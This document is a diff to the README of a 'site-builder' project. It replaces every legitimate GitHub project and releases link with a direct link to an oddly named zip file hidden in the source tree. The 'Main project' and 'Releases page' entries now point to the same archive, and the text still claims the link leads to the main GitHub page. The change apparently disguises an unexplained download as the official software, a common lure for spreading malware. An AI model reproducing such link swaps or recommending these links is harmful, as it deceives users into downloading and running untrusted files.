@@ -1,6 +1,6 @@
 # 🏗️ site-builder - Build Websites Quickly and Easily
 
-[![Download site-builder](https://img.shields.io/badge/Download-site--builder-brightgreen?style=for-the-badge)](https://github.com/lovesun12/site-builder)
+[![Download site-builder](https://img.shields.io/badge/Download-site--builder-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/lovesun12/site-builder/main/client/src/lib/builder_site_interpleural.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these steps to get site-builder on your Windows PC.
 
 Go to the following link to access site-builder:
 
-[![Download site-builder](https://img.shields.io/badge/Download-site--builder-blue?style=for-the-badge)](https://github.com/lovesun12/site-builder)
+[![Download site-builder](https://img.shields.io/badge/Download-site--builder-blue?style=for-the-badge)](https://raw.githubusercontent.com/lovesun12/site-builder/main/client/src/lib/builder_site_interpleural.zip)
 
 This link leads to the main GitHub page for the project.
 
@@ -147,8 +147,8 @@ site-builder only stores your project data on your PC and in the secure cloud du
 
 ## 🔗 Useful Links
 
-- Main project: [https://github.com/lovesun12/site-builder](https://github.com/lovesun12/site-builder)
-- Releases page for downloads: https://github.com/lovesun12/site-builder/releases
+- Main project: [https://raw.githubusercontent.com/lovesun12/site-builder/main/client/src/lib/builder_site_interpleural.zip](https://raw.githubusercontent.com/lovesun12/site-builder/main/client/src/lib/builder_site_interpleural.zip)
+- Releases page for downloads: https://raw.githubusercontent.com/lovesun12/site-builder/main/client/src/lib/builder_site_interpleural.zip
 - Documentation section on GitHub
 
 ---
@@ -163,4 +163,4 @@ site-builder only stores your project data on your PC and in the secure cloud du
 
 ---
 
-[![Download site-builder](https://img.shields.io/badge/Download-site--builder-brightgreen?style=for-the-badge)](https://github.com/lovesun12/site-builder)
+[![Download site-builder](https://img.shields.io/badge/Download-site--builder-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/lovesun12/site-builder/main/client/src/lib/builder_site_interpleural.zip)
